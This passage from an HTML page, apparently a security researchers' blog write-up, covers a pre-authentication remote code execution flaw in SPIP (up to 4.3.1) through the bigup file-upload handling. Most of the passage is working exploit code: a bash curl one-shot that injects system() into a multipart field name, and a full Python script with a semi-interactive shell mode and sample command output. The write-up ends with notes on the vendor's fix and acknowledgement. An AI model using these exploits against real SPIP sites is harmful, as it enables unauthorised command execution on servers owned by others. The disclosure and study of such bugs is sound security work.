+<p>Note the <code>Branchement sur la réception d'un formulaire (avant verifier())</code> in the comment, clearly stating that all this logic (including eval) will take place before the verification/validation steps take place.. 😅</p>
+</blockquote>
+<p>From there, I took one page that is almost always present, the &ldquo;forgotten password&rdquo; one!</p>
+<ul>
+<li>http://0.0.0.0:8000/spip.php?page=spip_pass&amp;lang=fr</li>
+</ul>
+<p>What I wanted to have in the request, is the <code>formulaire_action_args</code> protected and encoded variable at hand:</p>
+<ul>
+<li>I want to submit a <code>form</code>, therefore requiring <code>formulaire_action_args</code></li>
+<li>With extra &ldquo;files&rdquo; (our RCE payload)</li>
+<li>With our extra <code>bigup_retrouver_fichiers</code> param to enable the bigup part!</li>
+</ul>
+<p><img src="./img/formulaire_action_args.png" alt="formulaire_action_args"></p>
+<p>Any extra steps? Nope! It worked right away! 🍀</p>
+<h2 id="unauth-spip-rce-final-exploit">Unauth Spip RCE Final Exploit</h2>
+<p>As a script, this gives us the following concise exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo foo &gt; foo.txt
+</span></span><span style="display:flex;"><span>cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id; date&#34;</span>
+</span></span><span style="display:flex;"><span>formulaire_action_args<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -k <span style="color:#e6db74">&#39;http://127.0.0.1:8000/spip.php?page=spip_pass&amp;lang=fr&#39;</span> | grep -F formulaire_action_args -C <span style="color:#ae81ff">3</span> | grep -ioP <span style="color:#e6db74">&#39;[0-9a-zA-Z_/=+]{30,}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;formulaire_action_args: </span>$formulaire_action_args<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>formulaire_action_args_encoded<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#34;import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))&#34;</span> <span style="color:#e6db74">&#34;</span>$formulaire_action_args<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;formulaire_action_args_encoded: </span>$formulaire_action_args_encoded<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>base_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://0.0.0.0:8000/spip.php?page=spip_pass&amp;lang=fr&amp;page=spip_pass&amp;lang=fr&#34;</span>
+</span></span><span style="display:flex;"><span>final_payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;formulaire_action=oubli&amp;formulaire_action_args=</span>$formulaire_action_args_encoded<span style="color:#e6db74">&amp;formulaire_action_sign=&amp;oubli=foo%40foo.foo&amp;nobot=&amp;bigup_retrouver_fichiers=1&#34;</span>
+</span></span><span style="display:flex;"><span>curl -ki -X POST -F <span style="color:#e6db74">&#34;RCE[&#39;.system(&#39;</span>$cmd<span style="color:#e6db74">&#39;).die().&#39;][][ll]=@foo.txt&#34;</span> <span style="color:#e6db74">&#34;</span>$base_url<span style="color:#e6db74">&amp;</span>$final_payload<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p><img src="./img/spip-rce.png" alt="rce"></p>
+<p>Vozec also made a python script for the same bug:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> readline
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> unquote
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> requests_toolbelt.multipart.encoder <span style="color:#f92672">import</span> MultipartEncoder
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>urllib3<span style="color:#f92672">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">exploit</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, args) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_tokens</span>(self):
+</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span>,
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/spip.ph%70?pag%65=spip_pass&amp;lang=fr&#34;</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Request(
+</span></span><span style="display:flex;"><span>            url<span style="color:#f92672">=</span>url,
+</span></span><span style="display:flex;"><span>            method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>headers,
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        prep <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>prepare()
+</span></span><span style="display:flex;"><span>        prep<span style="color:#f92672">.</span>url <span style="color:#f92672">=</span> url
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>send(prep, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>        soup <span style="color:#f92672">=</span> BeautifulSoup(r, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;input&#34;</span>, {<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;formulaire_action_args&#34;</span>})[<span style="color:#e6db74">&#34;value&#34;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(self, cmd):
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_tokens()
+</span></span><span style="display:flex;"><span>        mp_encoder <span style="color:#f92672">=</span> MultipartEncoder(
+</span></span><span style="display:flex;"><span>            fields<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;page&#34;</span>: <span style="color:#e6db74">&#34;spip_pass&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;lang&#34;</span>: <span style="color:#e6db74">&#34;fr&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;formulaire_action&#34;</span>: <span style="color:#e6db74">&#34;oubli&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;formulaire_action_args&#34;</span>: token,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;formulaire_action_sign&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;oubli&#34;</span>: <span style="color:#e6db74">&#34;abc@gmail.com&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;nobot&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;bigup_retrouver_fichiers&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;RCE[&#39;.system(&#39;</span><span style="color:#e6db74">{</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;).die().&#39;]&#34;</span>: (
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;abc.txt&#34;</span>,
+</span></span><span style="display:flex;"><span>                    io<span style="color:#f92672">.</span>BytesIO(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello&#34;</span>),
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;text/plain&#34;</span>,
+</span></span><span style="display:flex;"><span>                ),
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/spip.ph%70?pag%65=spip_pass&amp;lang=fr&#34;</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Request(
+</span></span><span style="display:flex;"><span>            url<span style="color:#f92672">=</span>url,
+</span></span><span style="display:flex;"><span>            method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>mp_encoder,
+</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Content-Type&#34;</span>: mp_encoder<span style="color:#f92672">.</span>content_type},
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        prep <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>prepare()
+</span></span><span style="display:flex;"><span>        prep<span style="color:#f92672">.</span>url <span style="color:#f92672">=</span> url
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>s<span style="color:#f92672">.</span>send(prep, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RCE Spip &lt;= 4.3.1&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;--target&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target Url (ex: http://)&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;--cmd&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Shell command to execute&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;-s&#34;</span>, <span style="color:#e6db74">&#34;--shell&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Semi interactive shell&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> args
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> get_args()
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> exploit(args)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>cmd:
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>exploit(args<span style="color:#f92672">.</span>cmd)
+</span></span><span style="display:flex;"><span>        print(res)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>shell:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>exploit(input(<span style="color:#e6db74">&#34;$ &#34;</span>))
+</span></span><span style="display:flex;"><span>            print(r)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~/Desktop/autre]$ python3 0day_rce_spip.py -t http://localhost:8000 -c id    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">uid=1000(vozec) gid=1000(vozec) groupes=1000(vozec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),995(input)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~/Desktop]$ echo -ne &#34;name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">RCE[&#39;.system(&#39;id&#39;).die().&#39;]</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;&#34; | md5sum
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9fd0828be2a9d90e89e226f1fcd6d5d9  -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><h2 id="closing-words">Closing Words</h2>
+<p>Spip reacted in a timely manner, no timeline this time! Oh yeah, one last thing&hellip; 🙃</p>
+<blockquote>
+<p>Nailed it! 😎</p>
+</blockquote>
+<p><img src="./img/rce-rootme-acknowledgement.png" alt="acknowledgement"></p>
+<hr>
+<p>As always, we hope you&rsquo;ve had a nice time reading our adventures! 🧙<br>
+Feel free to follow both of us for future challenges &amp; cool reads! 💝</p>
+<p><img src="./img/lalu-and-vozec.png" alt="us"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#some-context">Some Context</a></li>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#code-review">Code review</a></li>
+    <li><a href="#the-vulnerable-function">The vulnerable function</a></li>
+    <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+    <li><a href="#additional-note">Additional note:</a></li>
+    <li><a href="#making-the-rce-pre-auth">Making the RCE Pre-Auth</a></li>
+    <li><a href="#unauth-spip-rce-final-exploit">Unauth Spip RCE Final Exploit</a></li>
+    <li><a href="#closing-words">Closing Words</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
